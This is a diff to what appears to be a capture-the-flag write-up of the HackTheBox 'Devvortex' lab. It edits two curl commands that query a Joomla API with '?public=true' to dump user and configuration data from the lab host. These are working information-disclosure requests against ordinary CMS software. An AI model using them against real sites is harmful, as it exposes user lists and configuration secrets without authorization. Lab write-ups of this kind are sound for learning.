@@ -167,10 +167,7 @@ curl http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
 <p>First, we can get information about the users:</p>
 
 ```bash
-curl "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100   725    0   725    0     0   5818      0 --:--:-- --:--:-- --:--:--  5846
+curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq
 {
   "links": {
     "self": "http://dev.devvortex.htb/api/index.php/v1/users?public=true"
@@ -222,10 +219,7 @@ curl "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq
 <p>Then, we can get configuration information:</p>
 
 ```bash
-curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  2010    0  2010    0     0  12102      0 --:--:-- --:--:-- --:--:-- 12181
+curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
 {
   "links": {
     "self": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true",
